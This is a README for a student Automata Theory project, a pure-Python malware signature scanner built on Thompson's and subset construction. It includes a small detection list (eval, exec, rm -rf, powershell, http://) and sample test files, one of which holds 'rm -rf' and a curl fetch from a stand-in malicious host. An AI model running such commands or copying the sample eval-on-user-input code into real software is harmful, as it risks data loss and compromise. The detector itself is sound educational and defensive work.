# Automata-Based Malware Signature Detector

**A practical implementation of Automata Theory concepts for cybersecurity applications**

[![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-Educational-green.svg)]()
[![Theory](https://img.shields.io/badge/Theory-Automata-orange.svg)]()

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Project Structure](#project-structure)
- [Installation](#installation)
- [Usage](#usage)
- [How It Works](#how-it-works)
- [Malware Signatures](#malware-signatures)
- [Examples](#examples)
- [Documentation](#documentation)
- [Student Contributions](#student-contributions)
- [Educational Value](#educational-value)
- [Future Enhancements](#future-enhancements)
- [References](#references)
- [License](#license)

---

## 🎯 Overview

This project implements a **malware signature detector** using core concepts from **Automata Theory**:
- **Regular Expressions (RE)** - Pattern specification
- **Non-deterministic Finite Automata (NFA)** - Pattern representation
- **Deterministic Finite Automata (DFA)** - Efficient pattern matching

Instead of relying on external regex libraries, this project builds the entire pattern matching engine from scratch, demonstrating how theoretical computer science concepts apply to real-world cybersecurity.

### Key Concepts Demonstrated

✅ **Thompson's Construction** - Converts regex to NFA  
✅ **Subset Construction** - Converts NFA to DFA  
✅ **DFA Simulation** - Efficient pattern matching  
✅ **Formal Language Theory** - Applied to security  

---

## ✨ Features

### Core Functionality
- ✅ **Regex-based malware signatures** - Define patterns as regular expressions
- ✅ **Pure Python implementation** - No external regex libraries for matching
- ✅ **Thompson's Construction** - Builds NFA from regex patterns
- ✅ **Subset Construction** - Converts NFA to DFA for efficiency
- ✅ **DFA Simulation** - O(n) time complexity for pattern matching
- ✅ **GUI Interface** - User-friendly Tkinter application
- ✅ **Multiple signatures** - Scan for multiple patterns simultaneously
- ✅ **Detailed results** - Shows line numbers, positions, and matched text

### Technical Highlights
- 🔧 **Modular architecture** - Clean separation of concerns
- 🔧 **Extensible design** - Easy to add new signatures
- 🔧 **Error handling** - Graceful error messages
- 🔧 **Well-documented** - Comprehensive code comments
- 🔧 **Educational** - Clear demonstration of theory

---

## 📁 Project Structure

```
automata_malware_detector/
│
├── automata/                    # Core automata theory implementation
│   ├── __init__.py
│   ├── regex_parser.py         # Tokenization & postfix conversion
│   ├── nfa.py                  # Thompson's Construction (Regex → NFA)
│   ├── dfa.py                  # Subset Construction (NFA → DFA) + Simulation
│   └── engine.py               # High-level scanning engine
│
├── gui/                        # User interface
│   ├── __init__.py
│   └── app.py                  # Tkinter GUI application
│
├── test_files/                 # Test malware samples
│   ├── README.md
│   ├── clean_script.py         # Benign code (no matches)
│   ├── suspicious_python_script.py
│   ├── backdoor_script.py
│   ├── data_exfiltration.py
│   ├── ransomware_simulator.py
│   ├── shell_injection.sh
│   └── mixed_content.py
│
├── signatures.py               # Malware signature database
├── main.py                     # Application entry point
└── README.md                   # This file
```

---

## 🚀 Installation

### Prerequisites
- Python 3.7 or higher
- Tkinter (usually included with Python)

### Setup

1. **Clone or download the project:**
   ```bash
   cd "c:\Users\IBBI\Desktop\automata project\automata_malware_detector"
   ```

2. **Verify Python installation:**
   ```bash
   python --version
   ```

3. **No additional dependencies required!** (Pure Python implementation)

---

## 💻 Usage

### Running the Application

```bash
python main.py
```

### Using the GUI

1. **Launch the application** - Run `main.py`
2. **Click "Browse"** - Select a file to scan
3. **Click "Scan"** - Start malware detection
4. **View results** - Matches appear in the table

### GUI Components

```
┌─────────────────────────────────────────────────────────────┐
│ Target file: [path/to/file.py]      [Browse]  [Scan]       │
├─────────────────────────────────────────────────────────────┤
│ Results Table:                                              │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ SIGNATURE │ REGEX │ LINE │ START │ END │ SNIPPET       │ │
│ │ eval_call │eval\( │  5   │   9   │ 14  │ eval(         │ │
│ └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│ Status: Scan complete. Matches found: 1                     │
├─────────────────────────────────────────────────────────────┤
│ Loaded Signatures:                                          │
│ eval_call: eval\(                                           │
│ exec_call: exec\(                                           │
│ ...                                                         │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔬 How It Works

### Complete Pipeline: Regex → NFA → DFA → Match

```
┌──────────────┐
│ Regex String │  "eval\("
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  Tokenize    │  ['e', 'v', 'a', 'l', EscapedChar('(')]
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ Add Concat   │  ['e', '.', 'v', '.', 'a', '.', 'l', '.', '(']
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  To Postfix  │  ['e', 'v', '.', 'a', '.', 'l', '.', '(', '.']
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ Thompson's   │  NFA with 10 states
│ Construction │  (includes ε-transitions)
└──────┬───────┘
       │
       ▼
┌──────────────┐
│   Subset     │  DFA with 5 states
│ Construction │  (deterministic, no ε-transitions)
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ DFA          │  Scan file line-by-line
│ Simulation   │  O(n) time complexity
└──────┬───────┘
       │
       ▼
┌──────────────┐
│   Matches    │  List of detected patterns
└──────────────┘
```

### Algorithm Details

#### **1. Regex Tokenization** ([`regex_parser.py`](file:///c:/Users/IBBI/Desktop/automata%20project/automata_malware_detector/automata/regex_parser.py))
- Converts regex string into tokens
- Handles escape sequences (`\(` → literal `(`)
- Identifies operators: `|`, `.`, `*`, `(`, `)`

#### **2. Thompson's Construction** ([`nfa.py`](file:///c:/Users/IBBI/Desktop/automata%20project/automata_malware_detector/automata/nfa.py))
- Builds NFA from postfix regex
- Implements standard constructions:
  - **Literal:** `a` → `start --a--> accept`
  - **Concatenation:** `ab` → `NFA(a) --ε--> NFA(b)`
  - **Union:** `a|b` → Split and merge with ε-transitions
  - **Kleene Star:** `a*` → Loop with ε-transitions

#### **3. Subset Construction** ([`dfa.py`](file:///c:/Users/IBBI/Desktop/automata%20project/automata_malware_detector/automata/dfa.py))
- Converts NFA to DFA
- Computes ε-closures
- Creates DFA states as sets of NFA states
- Eliminates non-determinism

#### **4. DFA Simulation** ([`dfa.py`](file:///c:/Users/IBBI/Desktop/automata%20project/automata_malware_detector/automata/dfa.py))
- Scans text using DFA
- Tries matching from each position
- Records longest matches
- O(n) time complexity per signature

---

## 🔐 Malware Signatures

### Current Signatures ([`signatures.py`](file:///c:/Users/IBBI/Desktop/automata%20project/automata_malware_detector/signatures.py))

| Signature Name | Regex Pattern | Detects | Risk Level |
|----------------|---------------|---------|------------|
| `eval_call` | `eval\(` | `eval()` function calls | 🔴 High |
| `exec_call` | `exec\(` | `exec()` function calls | 🔴 High |
| `base64_decode` | `base64\.b64decode\(` | Base64 decoding (obfuscation) | 🟠 Medium |
| `rm_rf` | `rm -rf` | Destructive file deletion | 🔴 Critical |
| `powershell` | `powershell` | PowerShell execution | 🟠 Medium |
| `http` | `http://` | HTTP URLs (C&C communication) | 🟡 Low |

### Adding New Signatures

Edit `signatures.py`:

```python
SIGNATURES = {
    # Existing signatures...
    
    # Add your new signature:
    "os_system": "os\\.system\\(",  # Detects os.system() calls
    "subprocess": "subprocess\\.",   # Detects subprocess usage
}
```

**Important:** Escape special regex characters:
- `.` → `\\.`
- `(` → `\\(`
- `)` → `\\)`
- `*` → `\\*`

---

## 📊 Examples

### Example 1: Clean File

**File:** `test_files/clean_script.py`
```python
def calculate_sum(a, b):
    return a + b

result = calculate_sum(5, 10)
print(f"Result: {result}")
```

**Result:** ✅ No matches found (safe file)

---

### Example 2: Suspicious File

**File:** `test_files/suspicious_python_script.py`
```python
import base64

user_code = input("Enter code: ")
result = eval(user_code)  # Dangerous!

exec("print('Hello')")  # Also dangerous!

encoded = "aGVsbG8="
decoded = base64.b64decode(encoded)
```

**Result:** 🚨 3 matches found

| SIGNATURE | LINE | SNIPPET |
|-----------|------|---------|
| eval_call | 4 | eval( |
| exec_call | 6 | exec( |
| base64_decode | 9 | base64.b64decode( |

---

### Example 3: Shell Script

**File:** `test_files/shell_injection.sh`
```bash
#!/bin/bash
rm -rf /tmp/data
powershell -Command "Get-Process"
curl http://malicious.com/payload
```

**Result:** 🚨 3 matches found

| SIGNATURE | LINE | SNIPPET |
|-----------|------|---------|
| rm_rf | 2 | rm -rf |
| powershell | 3 | powershell |
| http | 4 | http:// |

---

## 📚 Documentation

Comprehensive documentation is available in the `.gemini/antigravity/brain/` directory:

1. **[Project Mapping](file:///C:/Users/IBBI/.gemini/antigravity/brain/b9df09d3-ada4-48ca-b366-23e515275e8c/project_mapping.md)** - Complete alignment with proposal
2. **[System Architecture](file:///C:/Users/IBBI/.gemini/antigravity/brain/b9df09d3-ada4-48ca-b366-23e515275e8c/system_architecture.md)** - Detailed diagrams and flow charts
3. **[Output Explanation](file:///C:/Users/IBBI/.gemini/antigravity/brain/b9df09d3-ada4-48ca-b366-23e515275e8c/output_explanation.md)** - Understanding results and outputs

---

## 👥 Student Contributions

### Sheikh Muhammad Ahmed (65877)
**Focus:** Algorithm foundation & file interaction

**Contributions:**
- ✅ Regex tokenization (`regex_parser.py`)
- ✅ File I/O operations (`engine.py`)
- ✅ Test file creation (`test_files/`)
- ✅ Initial NFA conversion design
- ✅ Documentation and theoretical background

### Muhammad Ibtisam (65857)
**Focus:** Core backend logic + full GUI integration

**Contributions:**
- ✅ NFA → DFA conversion (`dfa.py`)
- ✅ DFA simulation engine (`dfa.py`)
- ✅ Regex → NFA main logic (`nfa.py`)
- ✅ Complete Tkinter GUI (`gui/app.py`)
- ✅ Frontend-backend integration (`engine.py`)
- ✅ Error handling and validation
- ✅ Integration testing

---

## 🎓 Educational Value

### Automata Theory Concepts

This project demonstrates:

1. **Regular Expressions**
   - Pattern specification language
   - Formal syntax and semantics

2. **Non-deterministic Finite Automata (NFA)**
   - ε-transitions
   - Multiple possible states
   - Thompson's Construction algorithm

3. **Deterministic Finite Automata (DFA)**
   - Single state at any time
   - Subset Construction algorithm
   - Efficient pattern matching

4. **Formal Language Theory**
   - Regular languages
   - Automata equivalence
   - Computational models

### Practical Application

Bridges theory and practice:
- 📖 **Theory:** Abstract computation models
- 💻 **Practice:** Real malware detection
- 🔗 **Connection:** Shows how CS theory solves real problems

---

## 🚀 Future Enhancements

Potential improvements:

### Advanced Regex Features
- ✨ Support for `+` (one or more)
- ✨ Support for `?` (zero or one)
- ✨ Character classes `[a-z]`, `[0-9]`
- ✨ Negation `[^a-z]`

### Visualization
- 📊 Graphical NFA/DFA state diagrams
- 📊 Animation of state transitions
- 📊 Visual regex debugging

### Performance
- ⚡ DFA minimization algorithm
- ⚡ Compilation caching
- ⚡ Parallel signature matching

### Features
- 🔧 Signature management GUI
- 🔧 Multi-file/directory scanning
- 🔧 Export results to CSV/JSON
- 🔧 Signature update mechanism

---

## 📖 References

[1] Hopcroft, J.E., Motwani, R., Ullman, J.D. *Introduction to Automata Theory, Languages, and Computation*. 3rd Edition.

[2] Daniel I.A. Cohen, *Introduction to Computer Theory*. 2nd Edition.

[3] Thompson, K. (1968). *Regular Expression Search Algorithm*. Communications of the ACM, 11(6), 419-422.

[4] Aho, A.V., Sethi, R., Ullman, J.D. *Compilers: Principles, Techniques, and Tools*. 2nd Edition.

[5] Research on Automata-Based Malware Detection Techniques (IEEE Papers, 2023–2025).

---

## 📄 License

This project is for **educational purposes only**. 

⚠️ **Disclaimer:** This tool is a demonstration of Automata Theory concepts. For production malware detection, use professional security tools with comprehensive signature databases and behavioral analysis.

---

## 🙏 Acknowledgments

- **Miss Misbah Anwar** - Course instructor
- **KIET** - Karachi Institute of Economics and Technology
- **Automata Theory Course** - For providing the theoretical foundation

---

## 📞 Contact

**Students:**
- Sheikh Muhammad Ahmed (65877)
- Muhammad Ibtisam (65857)

**Course:** Theory of Automata  
**Institution:** KIET (Karachi Institute of Economics and Technology)

---

## 🎯 Quick Start Guide

### 1. Run the Application
```bash
python main.py
```

### 2. Test with Sample Files
- Browse to `test_files/suspicious_python_script.py`
- Click "Scan"
- Observe detected patterns

### 3. Add Your Own Signatures
- Edit `signatures.py`
- Add new patterns
- Restart application

### 4. Scan Your Own Files
- Browse to any `.py`, `.sh`, or text file
- Click "Scan"
- Review results

---

**Built with ❤️ using Automata Theory**

*Demonstrating how theoretical computer science solves real-world problems*
